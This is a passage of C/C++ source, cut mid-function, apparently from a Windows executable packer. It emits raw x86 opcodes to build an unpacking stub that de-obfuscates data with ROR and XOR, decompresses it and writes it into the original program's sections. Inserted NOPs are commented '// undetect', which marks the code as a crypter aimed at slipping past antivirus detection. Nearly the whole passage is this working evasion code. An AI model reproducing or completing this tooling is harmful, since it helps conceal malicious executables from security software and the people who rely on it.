			WriteLittleEndian(CurrentAddress, (PBYTE)&VAR_BITOFFSET, sizeof(VAR_BITOFFSET)); CurrentAddress += sizeof(VAR_BITOFFSET);
			//MOV EDX BitOffset
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_SUB_ECX_EDX, sizeof(OP_SUB_ECX_EDX)); CurrentAddress += sizeof(OP_SUB_ECX_EDX);
			//SUB ECX EDX
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_SUB_ECX_EBX, sizeof(OP_SUB_ECX_EBX)); CurrentAddress += sizeof(OP_SUB_ECX_EBX);
			//SUB ECX EBX

				// ShiftRight(CH) = (8 - BitsToReadL);
			BYTE Eight = 0x08;
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_MOV_CH, sizeof(OP_MOV_CH)); CurrentAddress += sizeof(OP_MOV_CH);
			WriteLittleEndian(CurrentAddress, &Eight, sizeof(Eight)); CurrentAddress += sizeof(Eight);
			//MOV CH 8
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_SUB_CH_BL, sizeof(OP_SUB_CH_BL)); CurrentAddress += sizeof(OP_SUB_CH_BL);
			//SUB CH BL

				// BYTE Return(DL) = (BYTE)(BitBuffer[ByteOffset] << ShiftLeft) >> ShiftRight;
            WriteBigEndian(CurrentAddress, (PBYTE)&OP_MOV_EAX_DWORD_PTR_EBP_PLUS_DWORD, sizeof(OP_MOV_EAX_DWORD_PTR_EBP_PLUS_DWORD)); CurrentAddress += sizeof(OP_MOV_EAX_DWORD_PTR_EBP_PLUS_DWORD);
			WriteLittleEndian(CurrentAddress, (PBYTE)&VAR_BYTEOFFSET, sizeof(VAR_BYTEOFFSET)); CurrentAddress += sizeof(VAR_BYTEOFFSET);
			//MOV EAX ByteOffset
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_MOV_DL_BYTE_PTR_EAX_PLUS_DWORD, sizeof(OP_MOV_DL_BYTE_PTR_EAX_PLUS_DWORD)); CurrentAddress += sizeof(OP_MOV_DL_BYTE_PTR_EAX_PLUS_DWORD);
			WriteLittleEndian(CurrentAddress, (PBYTE)&ByteOffsetBase, sizeof(ByteOffsetBase)); CurrentAddress += sizeof(ByteOffsetBase);
			//MOV DL BYTE PTR EAX + ByteOffsetBase

			WriteBigEndian(CurrentAddress, (PBYTE)&OP_ROR_DL_BYTE, sizeof(OP_ROR_DL_BYTE)); CurrentAddress += sizeof(OP_ROR_DL_BYTE);
			WriteLittleEndian(CurrentAddress, (PBYTE)&Rotated, sizeof(Rotated)); CurrentAddress += sizeof(Rotated);
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_XOR_DL_BYTE, sizeof(OP_XOR_DL_BYTE)); CurrentAddress += sizeof(OP_XOR_DL_BYTE);
			WriteLittleEndian(CurrentAddress, (PBYTE)&Xored, sizeof(Xored)); CurrentAddress += sizeof(Xored);

			WriteBigEndian(CurrentAddress, (PBYTE)&OP_SHL_DL_CL, sizeof(OP_SHL_DL_CL)); CurrentAddress += sizeof(OP_SHL_DL_CL);
			//SHL DL CL
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_MOV_CL_CH, sizeof(OP_MOV_CL_CH)); CurrentAddress += sizeof(OP_MOV_CL_CH);
			//MOV CL CH
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_SHR_DL_CL, sizeof(OP_SHR_DL_CL)); CurrentAddress += sizeof(OP_SHR_DL_CL);
			//SHR DL CL

				// if(BitsToRead + BitOffset >= 8){
            WriteBigEndian(CurrentAddress, (PBYTE)&OP_MOV_EAX_DWORD_PTR_EBP_PLUS_DWORD, sizeof(OP_MOV_EAX_DWORD_PTR_EBP_PLUS_DWORD)); CurrentAddress += sizeof(OP_MOV_EAX_DWORD_PTR_EBP_PLUS_DWORD);
			WriteLittleEndian(CurrentAddress, (PBYTE)&VAR_BITSTOREAD, sizeof(VAR_BITSTOREAD)); CurrentAddress += sizeof(VAR_BITSTOREAD);
			//MOV EAX DWORD PTR BitsToRead
            WriteBigEndian(CurrentAddress, (PBYTE)&OP_MOV_EBX_DWORD_PTR_EBP_PLUS_DWORD, sizeof(OP_MOV_EBX_DWORD_PTR_EBP_PLUS_DWORD)); CurrentAddress += sizeof(OP_MOV_EBX_DWORD_PTR_EBP_PLUS_DWORD);
			WriteLittleEndian(CurrentAddress, (PBYTE)&VAR_BITOFFSET, sizeof(VAR_BITOFFSET)); CurrentAddress += sizeof(VAR_BITOFFSET);
			//MOV EBX DWORD PTR BitOffset
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_ADD_EAX_EBX, sizeof(OP_ADD_EAX_EBX)); CurrentAddress += sizeof(OP_ADD_EAX_EBX);
			//ADD EAX, EBX
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_CMP_EAX_DWORD, sizeof(OP_CMP_EAX_DWORD)); CurrentAddress += sizeof(OP_CMP_EAX_DWORD);
			WriteLittleEndian(CurrentAddress, (PBYTE)&Comparison, sizeof(Comparison)); CurrentAddress += sizeof(Comparison);
			//CMP EAX, 8
			JumpOffset = 0x60;
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_JL_SHORT, sizeof(OP_JL_SHORT)); CurrentAddress += sizeof(OP_JL_SHORT);
			WriteLittleEndian(CurrentAddress, (PBYTE)&JumpOffset, sizeof(JumpOffset)); CurrentAddress += sizeof(JumpOffset);
			//JL NotGreater
				// ByteOffset++;
            WriteBigEndian(CurrentAddress, (PBYTE)&OP_MOV_EAX_DWORD_PTR_EBP_PLUS_DWORD, sizeof(OP_MOV_EAX_DWORD_PTR_EBP_PLUS_DWORD)); CurrentAddress += sizeof(OP_MOV_EAX_DWORD_PTR_EBP_PLUS_DWORD);
			WriteLittleEndian(CurrentAddress, (PBYTE)&VAR_BYTEOFFSET, sizeof(VAR_BYTEOFFSET)); CurrentAddress += sizeof(VAR_BYTEOFFSET);
			//MOV EAX DWORD PTR ByteOffset
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_INC_EAX, sizeof(OP_INC_EAX)); CurrentAddress += sizeof(OP_INC_EAX);
			//INC EAX
            WriteBigEndian(CurrentAddress, (PBYTE)&OP_MOV_DWORD_PTR_EBP_PLUS_DWORD_EAX, sizeof(OP_MOV_DWORD_PTR_EBP_PLUS_DWORD_EAX)); CurrentAddress += sizeof(OP_MOV_DWORD_PTR_EBP_PLUS_DWORD_EAX);
			WriteLittleEndian(CurrentAddress, (PBYTE)&VAR_BYTEOFFSET, sizeof(VAR_BYTEOFFSET)); CurrentAddress += sizeof(VAR_BYTEOFFSET);
			//MOV DWORD PTR ByteOffset EAX
				// BitsToReadH = BitsToRead - BitsToReadL;
            WriteBigEndian(CurrentAddress, (PBYTE)&OP_MOV_EAX_DWORD_PTR_EBP_PLUS_DWORD, sizeof(OP_MOV_EAX_DWORD_PTR_EBP_PLUS_DWORD)); CurrentAddress += sizeof(OP_MOV_EAX_DWORD_PTR_EBP_PLUS_DWORD);
			WriteLittleEndian(CurrentAddress, (PBYTE)&VAR_BITSTOREAD, sizeof(VAR_BITSTOREAD)); CurrentAddress += sizeof(VAR_BITSTOREAD);
			//MOV EAX DWORD PTR BitsToRead
            WriteBigEndian(CurrentAddress, (PBYTE)&OP_MOV_EBX_DWORD_PTR_EBP_PLUS_DWORD, sizeof(OP_MOV_EBX_DWORD_PTR_EBP_PLUS_DWORD)); CurrentAddress += sizeof(OP_MOV_EBX_DWORD_PTR_EBP_PLUS_DWORD);
			WriteLittleEndian(CurrentAddress, (PBYTE)&VAR_BITSTOREADL, sizeof(VAR_BITSTOREADL)); CurrentAddress += sizeof(VAR_BITSTOREADL);
			//MOV EBX DWORD PTR BitsToReadL
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_SUB_EAX_EBX, sizeof(OP_SUB_EAX_EBX)); CurrentAddress += sizeof(OP_SUB_EAX_EBX);
			//SUB EAX EBX
            WriteBigEndian(CurrentAddress, (PBYTE)&OP_MOV_DWORD_PTR_EBP_PLUS_DWORD_EAX, sizeof(OP_MOV_DWORD_PTR_EBP_PLUS_DWORD_EAX)); CurrentAddress += sizeof(OP_MOV_DWORD_PTR_EBP_PLUS_DWORD_EAX);
			WriteLittleEndian(CurrentAddress, (PBYTE)&VAR_BITSTOREADH, sizeof(VAR_BITSTOREADH)); CurrentAddress += sizeof(VAR_BITSTOREADH);
			//MOV DWORD PTR BitsToReadH EAX
				// ShiftLeft(CL) = (8 - BitsToReadH);
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_MOV_ECX_DWORD, sizeof(OP_MOV_ECX_DWORD)); CurrentAddress += sizeof(OP_MOV_ECX_DWORD);
			WriteLittleEndian(CurrentAddress, (PBYTE)&Comparison, sizeof(Comparison)); CurrentAddress += sizeof(Comparison);
			//MOV ECX 8
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_SUB_ECX_EAX, sizeof(OP_SUB_ECX_EAX)); CurrentAddress += sizeof(OP_SUB_ECX_EAX);
			//SUB ECX EAX
				// ShiftRight(CH) = (8 - BitsToRead);
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_MOV_EBX_DWORD, sizeof(OP_MOV_EBX_DWORD)); CurrentAddress += sizeof(OP_MOV_EBX_DWORD);
			WriteLittleEndian(CurrentAddress, (PBYTE)&Comparison, sizeof(Comparison)); CurrentAddress += sizeof(Comparison);
			//MOV EBX 8
            WriteBigEndian(CurrentAddress, (PBYTE)&OP_MOV_EAX_DWORD_PTR_EBP_PLUS_DWORD, sizeof(OP_MOV_EAX_DWORD_PTR_EBP_PLUS_DWORD)); CurrentAddress += sizeof(OP_MOV_EAX_DWORD_PTR_EBP_PLUS_DWORD);
			WriteLittleEndian(CurrentAddress, (PBYTE)&VAR_BITSTOREAD, sizeof(VAR_BITSTOREAD)); CurrentAddress += sizeof(VAR_BITSTOREAD);
			//MOV EAX DWORD PTR BitsToRead
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_SUB_EBX_EAX, sizeof(OP_SUB_EBX_EAX)); CurrentAddress += sizeof(OP_SUB_EBX_EAX);
			//SUB EBX EAX
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_MOV_CH_BL, sizeof(OP_MOV_CH_BL)); CurrentAddress += sizeof(OP_MOV_CH_BL);
			//MOV CH BL
				// ReturnH = (BYTE)(BitBuffer[ByteOffset] << ShiftLeft) >> ShiftRight;
            WriteBigEndian(CurrentAddress, (PBYTE)&OP_MOV_EAX_DWORD_PTR_EBP_PLUS_DWORD, sizeof(OP_MOV_EAX_DWORD_PTR_EBP_PLUS_DWORD)); CurrentAddress += sizeof(OP_MOV_EAX_DWORD_PTR_EBP_PLUS_DWORD);
			WriteLittleEndian(CurrentAddress, (PBYTE)&VAR_BYTEOFFSET, sizeof(VAR_BYTEOFFSET)); CurrentAddress += sizeof(VAR_BYTEOFFSET);
			//MOV EAX ByteOffset
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_MOV_BL_BYTE_PTR_EAX_PLUS_DWORD, sizeof(OP_MOV_BL_BYTE_PTR_EAX_PLUS_DWORD)); CurrentAddress += sizeof(OP_MOV_BL_BYTE_PTR_EAX_PLUS_DWORD);
			WriteLittleEndian(CurrentAddress, (PBYTE)&ByteOffsetBase, sizeof(ByteOffsetBase)); CurrentAddress += sizeof(ByteOffsetBase);
			//MOV BL BYTE PTR EAX + ByteOffsetBase

			WriteBigEndian(CurrentAddress, (PBYTE)&OP_ROR_BL_BYTE, sizeof(OP_ROR_BL_BYTE)); CurrentAddress += sizeof(OP_ROR_BL_BYTE);
			WriteLittleEndian(CurrentAddress, (PBYTE)&Rotated, sizeof(Rotated)); CurrentAddress += sizeof(Rotated);
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_XOR_BL_BYTE, sizeof(OP_XOR_BL_BYTE)); CurrentAddress += sizeof(OP_XOR_BL_BYTE);
			WriteLittleEndian(CurrentAddress, (PBYTE)&Xored, sizeof(Xored)); CurrentAddress += sizeof(Xored);

			WriteBigEndian(CurrentAddress, (PBYTE)&OP_SHL_BL_CL, sizeof(OP_SHL_BL_CL)); CurrentAddress += sizeof(OP_SHL_BL_CL);
			//SHL BL CL
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_MOV_CL_CH, sizeof(OP_MOV_CL_CH)); CurrentAddress += sizeof(OP_MOV_CL_CH);
			//MOV CL CH
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_SHR_BL_CL, sizeof(OP_SHR_BL_CL)); CurrentAddress += sizeof(OP_SHR_BL_CL);
			//SHR BL CL
				// Return |= ReturnH;
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_OR_DL_BL, sizeof(OP_OR_DL_BL)); CurrentAddress += sizeof(OP_OR_DL_BL);
			//OR DL BL
				// BitOffset = BitsToReadH;
            WriteBigEndian(CurrentAddress, (PBYTE)&OP_MOV_EAX_DWORD_PTR_EBP_PLUS_DWORD, sizeof(OP_MOV_EAX_DWORD_PTR_EBP_PLUS_DWORD)); CurrentAddress += sizeof(OP_MOV_EAX_DWORD_PTR_EBP_PLUS_DWORD);
			WriteLittleEndian(CurrentAddress, (PBYTE)&VAR_BITSTOREADH, sizeof(VAR_BITSTOREADH)); CurrentAddress += sizeof(VAR_BITSTOREADH);
			//MOV EAX DWORD PTR BitsToReadH
            WriteBigEndian(CurrentAddress, (PBYTE)&OP_MOV_DWORD_PTR_EBP_PLUS_DWORD_EAX, sizeof(OP_MOV_DWORD_PTR_EBP_PLUS_DWORD_EAX)); CurrentAddress += sizeof(OP_MOV_DWORD_PTR_EBP_PLUS_DWORD_EAX);
			WriteLittleEndian(CurrentAddress, (PBYTE)&VAR_BITOFFSET, sizeof(VAR_BITOFFSET)); CurrentAddress += sizeof(VAR_BITOFFSET);
			//MOV DWORD PTR BitOffset EAX
			JumpOffset = 0x14;
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_JMP_SHORT, sizeof(OP_JMP_SHORT)); CurrentAddress += sizeof(OP_JMP_SHORT);
			WriteLittleEndian(CurrentAddress, (PBYTE)&JumpOffset, sizeof(JumpOffset)); CurrentAddress += sizeof(JumpOffset); // must calculate jump offset
			//JMP End
				// } else {
			//NotGreater:
				// BitOffset += BitsToRead
            WriteBigEndian(CurrentAddress, (PBYTE)&OP_MOV_EAX_DWORD_PTR_EBP_PLUS_DWORD, sizeof(OP_MOV_EAX_DWORD_PTR_EBP_PLUS_DWORD)); CurrentAddress += sizeof(OP_MOV_EAX_DWORD_PTR_EBP_PLUS_DWORD);
			WriteLittleEndian(CurrentAddress, (PBYTE)&VAR_BITOFFSET, sizeof(VAR_BITOFFSET)); CurrentAddress += sizeof(VAR_BITOFFSET);
			//MOV EAX DWORD PTR BitOffset
            WriteBigEndian(CurrentAddress, (PBYTE)&OP_MOV_EBX_DWORD_PTR_EBP_PLUS_DWORD, sizeof(OP_MOV_EBX_DWORD_PTR_EBP_PLUS_DWORD)); CurrentAddress += sizeof(OP_MOV_EBX_DWORD_PTR_EBP_PLUS_DWORD);
			WriteLittleEndian(CurrentAddress, (PBYTE)&VAR_BITSTOREAD, sizeof(VAR_BITSTOREAD)); CurrentAddress += sizeof(VAR_BITSTOREAD);
			//MOV EBX DWORD PTR BitsToRead
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_ADD_EAX_EBX, sizeof(OP_ADD_EAX_EBX)); CurrentAddress += sizeof(OP_ADD_EAX_EBX);
			//ADD EAX EBX
            WriteBigEndian(CurrentAddress, (PBYTE)&OP_MOV_DWORD_PTR_EBP_PLUS_DWORD_EAX, sizeof(OP_MOV_DWORD_PTR_EBP_PLUS_DWORD_EAX)); CurrentAddress += sizeof(OP_MOV_DWORD_PTR_EBP_PLUS_DWORD_EAX);
			WriteLittleEndian(CurrentAddress, (PBYTE)&VAR_BITOFFSET, sizeof(VAR_BITOFFSET)); CurrentAddress += sizeof(VAR_BITOFFSET);
			//MOV DWORD PTR BitOffset EAX
				// }
			//End:
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_RETN, sizeof(OP_RETN)); CurrentAddress += sizeof(OP_RETN);

			// decompress
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_XOR_EDI_EDI, sizeof(OP_XOR_EDI_EDI)); CurrentAddress += sizeof(OP_XOR_EDI_EDI);
			//WriteBigEndian(CurrentAddress, (PBYTE)&OP_MOV_EDI_DWORD, sizeof(OP_MOV_EDI_DWORD)); CurrentAddress += sizeof(OP_MOV_EDI_DWORD);
			//WriteLittleEndian(CurrentAddress, (PBYTE)&CompressedBufferSize, sizeof(CompressedBufferSize)); CurrentAddress += sizeof(CompressedBufferSize);
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_MOV_ESI_DWORD, sizeof(OP_MOV_ESI_DWORD)); CurrentAddress += sizeof(OP_MOV_ESI_DWORD);
			WriteLittleEndian(CurrentAddress, (PBYTE)&InitialDictionary, sizeof(InitialDictionary)); CurrentAddress += sizeof(InitialDictionary);
			PBYTE LoopLabel = CurrentAddress;
			DWORD BitsToGet = 8;
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_MOV_EAX_DWORD, sizeof(OP_MOV_EAX_DWORD)); CurrentAddress += sizeof(OP_MOV_EAX_DWORD);
			WriteLittleEndian(CurrentAddress, (PBYTE)&BitsToGet, sizeof(BitsToGet)); CurrentAddress += sizeof(BitsToGet);
            WriteBigEndian(CurrentAddress, (PBYTE)&OP_MOV_DWORD_PTR_EBP_PLUS_DWORD_EAX, sizeof(OP_MOV_DWORD_PTR_EBP_PLUS_DWORD_EAX)); CurrentAddress += sizeof(OP_MOV_DWORD_PTR_EBP_PLUS_DWORD_EAX);
			WriteLittleEndian(CurrentAddress, (PBYTE)&VAR_BITSTOREAD, sizeof(VAR_BITSTOREAD)); CurrentAddress += sizeof(VAR_BITSTOREAD);
            WriteBigEndian(CurrentAddress, (PBYTE)&OP_CALL_DWORD, sizeof(OP_CALL_DWORD)); CurrentAddress += sizeof(OP_CALL_DWORD);
			DWORD GetBitsFunctionAddress = -(CurrentAddress - GetBitsFunctionLabel + sizeof(DWORD));
			WriteLittleEndian(CurrentAddress, (PBYTE)&GetBitsFunctionAddress, sizeof(GetBitsFunctionAddress)); CurrentAddress += sizeof(GetBitsFunctionAddress);
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_PUSH_EDX, sizeof(OP_PUSH_EDX)); CurrentAddress += sizeof(OP_PUSH_EDX);
			BitsToGet = OFFSETBITS - 8;
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_MOV_EAX_DWORD, sizeof(OP_MOV_EAX_DWORD)); CurrentAddress += sizeof(OP_MOV_EAX_DWORD);
			WriteLittleEndian(CurrentAddress, (PBYTE)&BitsToGet, sizeof(BitsToGet)); CurrentAddress += sizeof(BitsToGet);
            WriteBigEndian(CurrentAddress, (PBYTE)&OP_MOV_DWORD_PTR_EBP_PLUS_DWORD_EAX, sizeof(OP_MOV_DWORD_PTR_EBP_PLUS_DWORD_EAX)); CurrentAddress += sizeof(OP_MOV_DWORD_PTR_EBP_PLUS_DWORD_EAX);
			WriteLittleEndian(CurrentAddress, (PBYTE)&VAR_BITSTOREAD, sizeof(VAR_BITSTOREAD)); CurrentAddress += sizeof(VAR_BITSTOREAD);
            WriteBigEndian(CurrentAddress, (PBYTE)&OP_CALL_DWORD, sizeof(OP_CALL_DWORD)); CurrentAddress += sizeof(OP_CALL_DWORD);
			GetBitsFunctionAddress = -(CurrentAddress - GetBitsFunctionLabel + sizeof(DWORD));
			WriteLittleEndian(CurrentAddress, (PBYTE)&GetBitsFunctionAddress, sizeof(GetBitsFunctionAddress)); CurrentAddress += sizeof(GetBitsFunctionAddress);
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_XCHG_DL_DH, sizeof(OP_XCHG_DL_DH)); CurrentAddress += sizeof(OP_XCHG_DL_DH);
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_POP_ECX, sizeof(OP_POP_ECX)); CurrentAddress += sizeof(OP_POP_ECX);
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_OR_EDX_ECX, sizeof(OP_OR_EDX_ECX)); CurrentAddress += sizeof(OP_OR_EDX_ECX);
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_PUSH_EDX, sizeof(OP_PUSH_EDX)); CurrentAddress += sizeof(OP_PUSH_EDX);
			BitsToGet = LENGTHBITS;
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_MOV_EAX_DWORD, sizeof(OP_MOV_EAX_DWORD)); CurrentAddress += sizeof(OP_MOV_EAX_DWORD);
			WriteLittleEndian(CurrentAddress, (PBYTE)&BitsToGet, sizeof(BitsToGet)); CurrentAddress += sizeof(BitsToGet);
            WriteBigEndian(CurrentAddress, (PBYTE)&OP_MOV_DWORD_PTR_EBP_PLUS_DWORD_EAX, sizeof(OP_MOV_DWORD_PTR_EBP_PLUS_DWORD_EAX)); CurrentAddress += sizeof(OP_MOV_DWORD_PTR_EBP_PLUS_DWORD_EAX);
			WriteLittleEndian(CurrentAddress, (PBYTE)&VAR_BITSTOREAD, sizeof(VAR_BITSTOREAD)); CurrentAddress += sizeof(VAR_BITSTOREAD);
		WriteBigEndian(CurrentAddress, (PBYTE)&OP_NOP, sizeof(OP_NOP)); CurrentAddress += sizeof(OP_NOP); // undetect
            WriteBigEndian(CurrentAddress, (PBYTE)&OP_CALL_DWORD, sizeof(OP_CALL_DWORD)); CurrentAddress += sizeof(OP_CALL_DWORD);
			GetBitsFunctionAddress = -(CurrentAddress - GetBitsFunctionLabel + sizeof(DWORD));
			WriteLittleEndian(CurrentAddress, (PBYTE)&GetBitsFunctionAddress, sizeof(GetBitsFunctionAddress)); CurrentAddress += sizeof(GetBitsFunctionAddress);
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_CMP_EDX_0, sizeof(OP_CMP_EDX_0)); CurrentAddress += sizeof(OP_CMP_EDX_0);
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_JNZ_SHORT, sizeof(OP_JNZ_SHORT)); CurrentAddress += sizeof(OP_JNZ_SHORT);
			JumpOffset = sizeof(OP_MOV_EDX_DWORD) + sizeof(DWORD);
			WriteLittleEndian(CurrentAddress, (PBYTE)&JumpOffset, sizeof(JumpOffset)); CurrentAddress += sizeof(JumpOffset);
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_MOV_EDX_DWORD, sizeof(OP_MOV_EDX_DWORD)); CurrentAddress += sizeof(OP_MOV_EDX_DWORD);
			DWORD LengthSize = LENGTHSIZE;
			WriteLittleEndian(CurrentAddress, (PBYTE)&LengthSize, sizeof(LengthSize)); CurrentAddress += sizeof(LengthSize);
		WriteBigEndian(CurrentAddress, (PBYTE)&OP_NOP, sizeof(OP_NOP)); CurrentAddress += sizeof(OP_NOP); // undetect
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_POP_ECX, sizeof(OP_POP_ECX)); CurrentAddress += sizeof(OP_POP_ECX);
			// ECX = Offset EDX = Length ESI = DictionaryOffset EDI = TotalSize
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_PUSH_ECX, sizeof(OP_PUSH_ECX)); CurrentAddress += sizeof(OP_PUSH_ECX);
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_PUSH_EDX, sizeof(OP_PUSH_EDX)); CurrentAddress += sizeof(OP_PUSH_EDX);
			PBYTE Loop1Label = CurrentAddress;
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_MOV_EAX_DWORD_PTR_EBP_PLUS_ECX, sizeof(OP_MOV_EAX_DWORD_PTR_EBP_PLUS_ECX)); CurrentAddress += sizeof(OP_MOV_EAX_DWORD_PTR_EBP_PLUS_ECX);
			
			// loads data into corresponding data locations, assumes file sections are in order
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_PUSH_EBP, sizeof(OP_PUSH_EBP)); CurrentAddress += sizeof(OP_PUSH_EBP);
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_PUSH_ECX, sizeof(OP_PUSH_ECX)); CurrentAddress += sizeof(OP_PUSH_ECX);
			DWORD TempTotal = 0;
			Section = (IMAGE_SECTION_HEADER*)((PCHAR)NtHeaders + sizeof(IMAGE_NT_HEADERS));
			for(UINT i = 0; i < OriginalNtHeaders.FileHeader.NumberOfSections; i++){
				//dprintf("%s %X(%X) %X %X\r\n", OriginalSection[i].Name, OriginalSection[i].SizeOfRawData, OriginalSection[i].Misc.VirtualSize, OriginalSection[i].PointerToRawData, OriginalSection[i].VirtualAddress);
				if(OriginalSection[i].SizeOfRawData > 0){
					WriteBigEndian(CurrentAddress, (PBYTE)&OP_MOV_ECX_EDI, sizeof(OP_MOV_ECX_EDI)); CurrentAddress += sizeof(OP_MOV_ECX_EDI);
					WriteBigEndian(CurrentAddress, (PBYTE)&OP_SUB_ECX_DWORD, sizeof(OP_SUB_ECX_DWORD)); CurrentAddress += sizeof(OP_SUB_ECX_DWORD);
					WriteLittleEndian(CurrentAddress, (PBYTE)&TempTotal, sizeof(TempTotal)); CurrentAddress += sizeof(TempTotal);
					TempTotal += OriginalSection[i].SizeOfRawData;
					WriteBigEndian(CurrentAddress, (PBYTE)&OP_CMP_EDI_DWORD, sizeof(OP_CMP_EDI_DWORD)); CurrentAddress += sizeof(OP_CMP_EDI_DWORD);
					WriteLittleEndian(CurrentAddress, (PBYTE)&TempTotal, sizeof(TempTotal)); CurrentAddress += sizeof(TempTotal);
					WriteBigEndian(CurrentAddress, (PBYTE)&OP_JGE_SHORT, sizeof(OP_JGE_SHORT)); CurrentAddress += sizeof(OP_JGE_SHORT);
					JumpOffset = sizeof(OP_MOV_EBP_DWORD) + sizeof(DWORD) + sizeof(OP_MOV_BYTE_PTR_EBP_PLUS_ECX_AL) + sizeof(OP_JMP_SHORT) + sizeof(BYTE);
					WriteLittleEndian(CurrentAddress, (PBYTE)&JumpOffset, sizeof(JumpOffset)); CurrentAddress += sizeof(JumpOffset);
					WriteBigEndian(CurrentAddress, (PBYTE)&OP_MOV_EBP_DWORD, sizeof(OP_MOV_EBP_DWORD)); CurrentAddress += sizeof(OP_MOV_EBP_DWORD);
					DWORD SectionAddress = OriginalSection[i].VirtualAddress + OriginalNtHeaders.OptionalHeader.ImageBase;
					WriteLittleEndian(CurrentAddress, (PBYTE)&SectionAddress, sizeof(SectionAddress)); CurrentAddress += sizeof(SectionAddress);
					WriteBigEndian(CurrentAddress, (PBYTE)&OP_MOV_BYTE_PTR_EBP_PLUS_ECX_AL, sizeof(OP_MOV_BYTE_PTR_EBP_PLUS_ECX_AL)); CurrentAddress += sizeof(OP_MOV_BYTE_PTR_EBP_PLUS_ECX_AL);
					WriteBigEndian(CurrentAddress, (PBYTE)&OP_JMP_SHORT, sizeof(OP_JMP_SHORT)); CurrentAddress += sizeof(OP_JMP_SHORT);
					JumpOffset = 0x19;
					WriteLittleEndian(CurrentAddress, (PBYTE)&JumpOffset, sizeof(JumpOffset)); CurrentAddress += sizeof(JumpOffset); // must calculate jump offset
				}
			}
			CurrentAddress -= sizeof(OP_JMP_SHORT) + sizeof(BYTE);
			for(UINT i = 0; i < sizeof(OP_JMP_SHORT) + sizeof(BYTE); i++){
				WriteBigEndian(CurrentAddress, (PBYTE)&OP_NOP, sizeof(OP_NOP)); CurrentAddress += sizeof(OP_NOP);
			}
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_POP_ECX, sizeof(OP_POP_ECX)); CurrentAddress += sizeof(OP_POP_ECX);
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_POP_EBP, sizeof(OP_POP_EBP)); CurrentAddress += sizeof(OP_POP_EBP);


			WriteBigEndian(CurrentAddress, (PBYTE)&OP_ADD_EDX_DWORD, sizeof(OP_ADD_EDX_DWORD)); CurrentAddress += sizeof(OP_ADD_EDX_DWORD);
			WriteLittleEndian(CurrentAddress, (PBYTE)&VAR_STOREDBYTES, sizeof(VAR_STOREDBYTES)); CurrentAddress += sizeof(VAR_STOREDBYTES);
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_MOV_BYTE_PTR_EBP_PLUS_EDX_AL, sizeof(OP_MOV_BYTE_PTR_EBP_PLUS_EDX_AL)); CurrentAddress += sizeof(OP_MOV_BYTE_PTR_EBP_PLUS_EDX_AL);
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_SUB_EDX_DWORD, sizeof(OP_SUB_EDX_DWORD)); CurrentAddress += sizeof(OP_SUB_EDX_DWORD);
			WriteLittleEndian(CurrentAddress, (PBYTE)&VAR_STOREDBYTES, sizeof(VAR_STOREDBYTES)); CurrentAddress += sizeof(VAR_STOREDBYTES);
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_INC_ECX, sizeof(OP_INC_ECX)); CurrentAddress += sizeof(OP_INC_ECX);
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_INC_EDI, sizeof(OP_INC_EDI)); CurrentAddress += sizeof(OP_INC_EDI);
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_DEC_EDX, sizeof(OP_DEC_EDX)); CurrentAddress += sizeof(OP_DEC_EDX);
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_JNZ_NEAR, sizeof(OP_JNZ_NEAR)); CurrentAddress += sizeof(OP_JNZ_NEAR);
			DWORD JumpOffsetD = -(CurrentAddress - Loop1Label + sizeof(JumpOffsetD));
			WriteLittleEndian(CurrentAddress, (PBYTE)&JumpOffsetD, sizeof(JumpOffsetD)); CurrentAddress += sizeof(JumpOffsetD);

			// write to compression dictionary
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_POP_EDX, sizeof(OP_POP_EDX)); CurrentAddress += sizeof(OP_POP_EDX);
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_POP_ECX, sizeof(OP_POP_ECX)); CurrentAddress += sizeof(OP_POP_ECX);
